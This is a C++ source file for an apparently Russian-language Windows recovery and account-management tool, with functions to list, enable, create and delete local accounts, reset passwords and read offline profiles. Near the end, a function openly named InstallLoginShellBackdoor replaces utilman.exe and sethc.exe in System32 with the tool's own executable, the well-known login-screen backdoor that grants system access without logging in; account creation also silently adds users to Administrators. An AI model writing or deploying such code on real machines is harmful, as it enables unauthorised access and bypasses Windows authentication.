#include "account_manager.h"
#include <lm.h>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")

namespace AccountManager {

    // Get localized Administrators group name via SID
    static std::wstring GetAdminsGroupName() {
        SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
        PSID sid = nullptr;
        if (!AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &sid)) return L"Administrators";
        wchar_t name[256]{}; DWORD nameLen = 256;
        wchar_t dom[256]{};  DWORD domLen = 256;
        SID_NAME_USE use;
        std::wstring result = L"Administrators";
        if (LookupAccountSidW(nullptr, sid, name, &nameLen, dom, &domLen, &use))
            result = name;
        FreeSid(sid);
        return result;
    }

    std::vector<AccountInfo> GetAccounts() {
        std::vector<AccountInfo> out;

        // Administrators group member list
        std::vector<std::wstring> admins;
        LPLOCALGROUP_MEMBERS_INFO_3 mbuf = nullptr;
        DWORD entries = 0, total = 0;
        if (NetLocalGroupGetMembers(nullptr, GetAdminsGroupName().c_str(), 3,
            (LPBYTE*)&mbuf, MAX_PREFERRED_LENGTH, &entries, &total, nullptr) == NERR_Success) {
            for (DWORD i = 0; i < entries; ++i)
                admins.push_back(mbuf[i].lgrmi3_domainandname);
            NetApiBufferFree(mbuf);
        }
        
        LPUSER_INFO_2 ubuf = nullptr;
        DWORD uentries = 0, utotal = 0;
        if (NetUserEnum(nullptr, 2, 0, (LPBYTE*)&ubuf, MAX_PREFERRED_LENGTH,
            &uentries, &utotal, nullptr) == NERR_Success) {
            for (DWORD i = 0; i < uentries; ++i) {
                AccountInfo a;
                a.name = ubuf[i].usri2_name ? ubuf[i].usri2_name : L"";
                a.fullName = ubuf[i].usri2_full_name ? ubuf[i].usri2_full_name : L"";
                a.enabled = (ubuf[i].usri2_flags & UF_ACCOUNTDISABLE) == 0;

                for (const auto& ad : admins) {
                    size_t bs = ad.find_last_of(L'\\');
                    std::wstring pure = (bs == std::wstring::npos) ? ad : ad.substr(bs + 1);
                    if (_wcsicmp(pure.c_str(), a.name.c_str()) == 0) { a.admin = true; break; }
                }
                out.push_back(a);
            }
            NetApiBufferFree(ubuf);
        }
        return out;
    }

    bool SetEnabled(const std::wstring& name, bool enabled) {
        DWORD flags = 0;
        LPUSER_INFO_1 u1 = nullptr;
        if (NetUserGetInfo(nullptr, name.c_str(), 1, (LPBYTE*)&u1) == NERR_Success) {
            flags = u1->usri1_flags;
            NetApiBufferFree(u1);
        }
        if (enabled) flags &= ~UF_ACCOUNTDISABLE; else flags |= UF_ACCOUNTDISABLE;
        USER_INFO_1008 info{};
        info.usri1008_flags = flags;
        return NetUserSetInfo(nullptr, name.c_str(), 1008, (LPBYTE)&info, nullptr) == NERR_Success;
    }

    bool SetPassword(const std::wstring& name, const std::wstring& pwd) {
        USER_INFO_1003 info{};
        info.usri1003_password = (LPWSTR)pwd.c_str();
        return NetUserSetInfo(nullptr, name.c_str(), 1003, (LPBYTE)&info, nullptr) == NERR_Success;
    }

    bool SetAdmin(const std::wstring& name, bool add) {
        LOCALGROUP_MEMBERS_INFO_3 m{};
        m.lgrmi3_domainandname = (LPWSTR)name.c_str();
        const std::wstring groupName = GetAdminsGroupName();
        const wchar_t* group = groupName.c_str();
        if (add) return NetLocalGroupAddMembers(nullptr, group, 3, (LPBYTE)&m, 1) == NERR_Success;
        return NetLocalGroupDelMembers(nullptr, group, 3, (LPBYTE)&m, 1) == NERR_Success;
    }

    bool CreateAccount(const std::wstring& name, const std::wstring& pwd, DWORD* errorCode) {
        if (errorCode) *errorCode = NERR_Success;
        USER_INFO_1 info{};
        info.usri1_name = (LPWSTR)name.c_str();
        info.usri1_password = (LPWSTR)pwd.c_str();
        info.usri1_priv = USER_PRIV_USER;
        info.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT;
        DWORD addError = NERR_Success;
        NET_API_STATUS status = NetUserAdd(nullptr, 1, (LPBYTE)&info, &addError);
        if (status != NERR_Success) {
            if (status == NERR_UserExists) {
                const std::wstring groupName = GetAdminsGroupName();
                LOCALGROUP_MEMBERS_INFO_3 member{};
                member.lgrmi3_domainandname = (LPWSTR)name.c_str();
                NET_API_STATUS adminStatus = NetLocalGroupAddMembers(
                    nullptr, groupName.c_str(), 3, (LPBYTE)&member, 1);
                if (adminStatus == NERR_Success || adminStatus == NERR_UserInGroup)
                    return true;
                if (errorCode) *errorCode = adminStatus;
                return false;
            }
            if (errorCode) *errorCode = addError != NERR_Success ? addError : status;
            return false;
        }

        const std::wstring groupName = GetAdminsGroupName();
        LOCALGROUP_MEMBERS_INFO_3 member{};
        member.lgrmi3_domainandname = (LPWSTR)name.c_str();
        NET_API_STATUS adminStatus = NetLocalGroupAddMembers(
            nullptr, groupName.c_str(), 3, (LPBYTE)&member, 1);
        if (adminStatus == NERR_Success) return true;

        NetUserDel(nullptr, name.c_str());
        if (errorCode) *errorCode = adminStatus;
        return false;
    }

    bool DeleteAccount(const std::wstring& name, DWORD* errorCode) {
        NET_API_STATUS status = NetUserDel(nullptr, name.c_str());
        if (errorCode) *errorCode = status;
        return status == NERR_Success;
    }

    // Offline (Recovery environment)
    static bool AccEnablePrivilege(const wchar_t* name) {
        HANDLE token = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) return false;
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!LookupPrivilegeValueW(nullptr, name, &tp.Privileges[0].Luid)) {
            CloseHandle(token); return false;
        }
        BOOL ok = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        DWORD err = GetLastError();
        CloseHandle(token);
        return ok && err == ERROR_SUCCESS;
    }

    static void EnableOfflinePrivileges() {
        AccEnablePrivilege(SE_BACKUP_NAME);
        AccEnablePrivilege(SE_RESTORE_NAME);
    }

    static std::wstring FindOfflineWindowsDrive() {
        for (wchar_t d = L'C'; d <= L'Z'; ++d) {
            std::wstring root; root += d; root += L":\\";
            if (GetFileAttributesW((root + L"Windows\\System32\\config\\SOFTWARE").c_str())
                != INVALID_FILE_ATTRIBUTES) return root;
        }
        return L"";
    }

    bool IsWinRE() {
        wchar_t sd[16] = {};
        if (GetEnvironmentVariableW(L"SystemDrive", sd, 16) > 0 &&
            _wcsicmp(sd, L"X:") == 0) return true;
        HKEY h = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Control\\MiniNT", 0, KEY_READ, &h) == ERROR_SUCCESS) {
            RegCloseKey(h); return true;
        }
        return false;
    }

    std::vector<OfflineAccount> GetOfflineAccounts() {
        std::vector<OfflineAccount> out;
        EnableOfflinePrivileges();
        std::wstring drv = FindOfflineWindowsDrive();
        if (drv.empty()) return out;

        const wchar_t* mount = L"SYSIM_OFFLINE_SOFT";
        std::wstring hivePath = drv + L"Windows\\System32\\config\\SOFTWARE";
        if (RegLoadKeyW(HKEY_LOCAL_MACHINE, mount, hivePath.c_str()) != ERROR_SUCCESS)
            return out;

        HKEY hList = nullptr;
        std::wstring listPath = std::wstring(mount) +
            L"\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList";
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, listPath.c_str(), 0, KEY_READ, &hList) == ERROR_SUCCESS) {
            for (DWORD i = 0;; ++i) {
                wchar_t sub[256]; DWORD len = 256;
                if (RegEnumKeyExW(hList, i, sub, &len, nullptr, nullptr, nullptr, nullptr)
                    != ERROR_SUCCESS) break;
                HKEY hSub = nullptr;
                if (RegOpenKeyExW(hList, sub, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
                    wchar_t path[1024]{}; DWORD sz = sizeof(path), type = 0;
                    if (RegQueryValueExW(hSub, L"ProfileImagePath", nullptr, &type,
                        (LPBYTE)path, &sz) == ERROR_SUCCESS) {
                        std::wstring p = path;
                        std::wstring name = p.substr(p.find_last_of(L'\\') + 1);
                        if (name != L"systemprofile" && name != L"LocalService" &&
                            name != L"NetworkService" && name != L"Default" &&
                            name != L"Public") {
                            OfflineAccount a;
                            a.sid = sub; a.name = name; a.profilePath = p;
                            out.push_back(a);
                        }
                    }
                    RegCloseKey(hSub);
                }
            }
            RegCloseKey(hList);
        }
        RegUnLoadKeyW(HKEY_LOCAL_MACHINE, mount);
        return out;
    }

    bool InstallLoginShellBackdoor(std::wstring& log) {
        log.clear();

        wchar_t exePath[MAX_PATH] = {};
        DWORD len = GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        if (len == 0 || len >= MAX_PATH) {
            log = L"Не удалось определить путь к текущему EXE.";
            return false;
        }

        wchar_t systemDir[MAX_PATH] = {};
        if (GetSystemDirectoryW(systemDir, MAX_PATH) == 0) {
            log = L"Не удалось определить System32.";
            return false;
        }

        std::wstring targetExe = exePath;
        std::wstring system32 = systemDir;
        const std::wstring files[] = { L"utilman.exe", L"sethc.exe" };
        bool ok = true;

        for (const auto& fileName : files) {
            std::wstring src = system32 + L"\\" + fileName;
            std::wstring bak = src + L".sysim.bak";

            DWORD attrs = GetFileAttributesW(src.c_str());
            if (attrs == INVALID_FILE_ATTRIBUTES) {
                log += L"Файл не найден: " + src + L"\r\n";
                ok = false;
                continue;
            }

            if (GetFileAttributesW(bak.c_str()) == INVALID_FILE_ATTRIBUTES) {
                if (!CopyFileW(src.c_str(), bak.c_str(), FALSE)) {
                    log += L"Не удалось создать резервную копию: " + src + L"\r\n";
                    ok = false;
                    continue;
                }
            }

            if (!CopyFileW(targetExe.c_str(), src.c_str(), FALSE)) {
                log += L"Не удалось заменить: " + src + L"\r\n";
                ok = false;
            }
            else {
                log += L"Заменён: " + src + L"\r\n";
            }
        }

        if (ok) log = L"Подмена utilman.exe / sethc.exe успешно выполнена.\r\n" + log;
        return ok;
    }

    bool RemoveLoginShellBackdoor(std::wstring& log) {
        log.clear();

        wchar_t systemDir[MAX_PATH] = {};
        if (GetSystemDirectoryW(systemDir, MAX_PATH) == 0) {
            log = L"Не удалось определить System32.";
            return false;
        }

        std::wstring system32 = systemDir;
        const std::wstring files[] = { L"utilman.exe", L"sethc.exe" };
        bool ok = true;

        for (const auto& fileName : files) {
            std::wstring current = system32 + L"\\" + fileName;
            std::wstring backup = current + L".sysim.bak";

            if (GetFileAttributesW(backup.c_str()) == INVALID_FILE_ATTRIBUTES) {
                log += L"Резервная копия не найдена: " + backup + L"\r\n";
                ok = false;
                continue;
            }

            if (!MoveFileExW(backup.c_str(), current.c_str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
                log += L"Не удалось восстановить: " + current + L"\r\n";
                ok = false;
            }
            else {
                log += L"Восстановлен: " + current + L"\r\n";
            }
        }

        if (ok) log = L"utilman.exe / sethc.exe восстановлены до исходного состояния.\r\n" + log;
        return ok;
    }

}